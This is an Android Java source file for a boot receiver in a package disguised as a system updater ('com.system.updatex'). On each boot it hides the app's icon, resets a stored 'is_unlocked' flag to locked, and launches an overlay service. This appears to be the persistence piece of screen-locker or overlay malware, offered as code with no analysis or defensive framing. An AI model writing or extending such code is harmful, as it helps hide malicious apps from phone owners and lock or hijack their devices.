package com.system.updatex;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) || Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(intent.getAction()))) {
            
            // Hide icon immediately
            IconUtils.hideIcon(context);

            // Reset state
            context.getSharedPreferences("fr4nx_state", Context.MODE_PRIVATE)
                .edit()
                .putBoolean("is_unlocked", false)
                .commit();

            // Start service immediately
            Intent serviceIntent = new Intent(context, OverlayService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
